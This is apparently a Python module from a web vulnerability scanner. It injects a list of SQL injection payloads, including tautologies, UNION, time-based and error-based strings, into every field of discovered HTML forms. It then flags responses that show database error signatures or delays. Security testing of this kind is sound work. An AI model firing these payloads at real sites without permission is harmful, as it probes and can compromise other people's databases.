import requests
from urllib.parse import urljoin
from colorama import Fore, Style
import re

# SQL injection payloads for different databases
SQLI_PAYLOADS = [
    # Basic injection tests
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "admin'#",
    
    # Union-based tests
    "' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    
    # Time-based blind tests
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    
    # Boolean-based blind tests
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 'a'='a",
    "' OR 'a'='b",
    
    # Error-based tests
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
]

# SQL error signatures for different databases
SQL_ERRORS = [
    # MySQL
    "mysql_fetch_array", "mysql_num_rows", "mysql_fetch_assoc",
    "mysql_fetch_row", "mysql_connect", "mysql_result",
    "You have an error in your SQL syntax",
    "mysql server version for the right syntax",
    
    # PostgreSQL
    "pg_query", "pg_fetch_array", "pg_num_rows", "pg_connect",
    "PostgreSQL query failed", "supplied argument is not a valid PostgreSQL result",
    "syntax error at or near",
    
    # MSSQL
    "mssql_query", "mssql_fetch_array", "mssql_num_rows",
    "Microsoft OLE DB Provider", "ODBC Microsoft Access Driver",
    "Unclosed quotation mark", "Incorrect syntax near",
    
    # Oracle
    "ociexecute", "ocifetchstatement", "ora_fetch_into",
    "ORA-00933", "ORA-00921", "ORA-00936",
    
    # SQLite
    "sqlite_query", "sqlite_fetch_array", "sqlite_num_rows",
    "SQLite/JDBCDriver", "System.Data.SQLite.SQLiteException",
    
    # Generic SQL errors
    "SQL syntax", "database error", "warning: mysql",
    "valid MySQL result", "MySqlClient", "ORA-01756"
]

def test_sqli(links, forms, progress_callback=None, finding_callback=None, scan_config=None):
    """
    Test forms for SQL injection vulnerabilities
    Args:
        links: List of URLs (unused but kept for compatibility)
        forms: List of (url, form_element) tuples
        progress_callback: Optional callback for progress updates
        finding_callback: Optional callback for reporting findings in real-time
        scan_config: Optional dict with authentication and request configuration:
            - cookies: dict of cookies to send
            - headers: dict of custom headers
            - proxies: dict of proxy configuration
            - verify_ssl: bool to verify SSL certificates
            - timeout: int seconds for request timeout
            - basic_auth: tuple (username, password)
            - verbose: int verbosity level
    Returns:
        List of vulnerability findings
    """
    # Default scan config
    if scan_config is None:
        scan_config = {}
    
    cookies = scan_config.get('cookies', {})
    headers = scan_config.get('headers', {})
    proxies = scan_config.get('proxies', None)
    verify_ssl = scan_config.get('verify_ssl', True)
    timeout = scan_config.get('timeout', 15)
    basic_auth = scan_config.get('basic_auth', None)
    verbose = scan_config.get('verbose', 0)
    
    findings = []
    
    for url, form in forms:
        try:
            # Get form action and method
            action = form.get("action")
            if action:
                action = urljoin(url, action)
            else:
                action = url
                
            method = form.get("method", "get").lower()
            
            # Get all input fields
            inputs = {}
            submit_inputs = {}  # Track submit buttons separately
            
            for input_field in form.find_all(["input", "textarea", "select"]):
                name = input_field.get("name")
                if name:
                    field_type = input_field.get("type", "text")
                    
                    # Track submit buttons but don't inject into them
                    if field_type.lower() == "submit":
                        submit_inputs[name] = input_field.get("value", "Submit")
                        continue
                    
                    # Skip other non-injectable input types
                    if field_type.lower() in ["button", "reset", "file", "image"]:
                        continue
                        
                    # Use appropriate default values
                    if field_type.lower() == "email":
                        inputs[name] = "test@example.com"
                    elif field_type.lower() == "password":
                        inputs[name] = "password123"
                    elif field_type.lower() == "number":
                        inputs[name] = "123"
                    elif field_type.lower() == "hidden":
                        # Preserve hidden field values (often CSRF tokens)
                        inputs[name] = input_field.get("value", "")
                    else:
                        inputs[name] = "test_value"
            
            if not inputs:
                continue
            
            # Merge submit button values into inputs (needed for form processing)
            inputs.update(submit_inputs)

            # Test each payload
            for payload in SQLI_PAYLOADS:
                test_inputs = inputs.copy()
                
                # Inject payload into each field
                for field_name in test_inputs:
                    test_inputs[field_name] = payload
                    
                    try:
                        session = requests.Session()
                        
                        # Set default User-Agent if not provided
                        session_headers = headers.copy() if headers else {}
                        if 'User-Agent' not in session_headers:
                            session_headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        
                        session.headers.update(session_headers)
                        
                        # Apply cookies
                        if cookies:
                            session.cookies.update(cookies)
                        
                        # Apply basic auth
                        if basic_auth:
                            session.auth = basic_auth
                        
                        if method == "post":
                            response = session.post(
                                action, 
                                data=test_inputs, 
                                timeout=timeout, 
                                allow_redirects=True,
                                proxies=proxies,
                                verify=verify_ssl
                            )
                        else:
                            response = session.get(
                                action, 
                                params=test_inputs, 
                                timeout=timeout, 
                                allow_redirects=True,
                                proxies=proxies,
                                verify=verify_ssl
                            )
                        
                        if verbose >= 2:
                            print(f"{Fore.BLUE}    SQLi Test: {action} [{method.upper()}] - {response.status_code}{Style.RESET_ALL}")
                        
                        response_text = response.text.lower()
                        
                        # Check for SQL error signatures
                        sql_error_found = False
                        detected_error = ""
                        
                        for error_sig in SQL_ERRORS:
                            if error_sig.lower() in response_text:
                                sql_error_found = True
                                detected_error = error_sig
                                break
                        
                        # Also check for time-based SQLi (basic detection)
                        time_based_indicators = ["sleep", "waitfor", "pg_sleep"]
                        is_time_based = any(indicator in payload.lower() for indicator in time_based_indicators)
                        
                        if sql_error_found or (is_time_based and response.elapsed.total_seconds() > 4):
                            vuln_type = "Time-based SQLi" if is_time_based else "Error-based SQLi"
                            
                            finding = {
                                "type": "SQL Injection",
                                "subtype": vuln_type,
                                "url": url,
                                "details": f"Possible {vuln_type} in field '{field_name}' at {action}",
                                "payload": payload,
                                "method": method.upper(),
                                "error_signature": detected_error if detected_error else "Time delay detected",
                                "severity": "critical"
                            }
                            
                            # Avoid duplicate findings
                            if not any(f['url'] == finding['url'] and f['details'] == finding['details'] for f in findings):
                                findings.append(finding)
                                if finding_callback:
                                    finding_callback(finding)
                                else:
                                    print(f"{Fore.RED}[!] SQLi Found: {url} - Field: {field_name} - Type: {vuln_type}{Style.RESET_ALL}")
                            break  # Found SQLi in this field, try next field
                            
                    except requests.exceptions.Timeout:
                        # Timeout might indicate time-based SQLi
                        if any(indicator in payload.lower() for indicator in ["sleep", "waitfor", "pg_sleep"]):
                            finding = {
                                "type": "SQL Injection",
                                "subtype": "Time-based SQLi (Timeout)",
                                "url": url,
                                "details": f"Possible time-based SQLi in field '{field_name}' at {action} (timeout)",
                                "payload": payload,
                                "method": method.upper(),
                                "error_signature": "Request timeout",
                                "severity": "critical"
                            }
                            
                            if not any(f['url'] == finding['url'] and f['details'] == finding['details'] for f in findings):
                                findings.append(finding)
                                if finding_callback:
                                    finding_callback(finding)
                                else:
                                    print(f"{Fore.RED}[!] SQLi Found (Timeout): {url} - Field: {field_name}{Style.RESET_ALL}")
                        
                        if not finding_callback:
                            print(f"{Fore.YELLOW}[!] Timeout testing SQLi on {action}{Style.RESET_ALL}")
                    except requests.exceptions.SSLError as e:
                        if verbose >= 1:
                            print(f"{Fore.YELLOW}[!] SSL error testing SQLi on {action}: {str(e)[:50]}{Style.RESET_ALL}")
                    except requests.exceptions.ProxyError as e:
                        if verbose >= 1:
                            print(f"{Fore.YELLOW}[!] Proxy error testing SQLi on {action}: {str(e)[:50]}{Style.RESET_ALL}")
                    except requests.exceptions.RequestException:
                        pass  # Continue with next test
                    except Exception as e:
                        if verbose >= 1:
                            print(f"{Fore.YELLOW}[!] Error testing SQLi: {str(e)[:50]}{Style.RESET_ALL}")
                    
                    # Reset for next field test  
                    test_inputs[field_name] = inputs[field_name]
                    
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Error testing SQLi on {url}: {str(e)[:100]}{Style.RESET_ALL}")
            
        if progress_callback:
            progress_callback()
    
    return findings
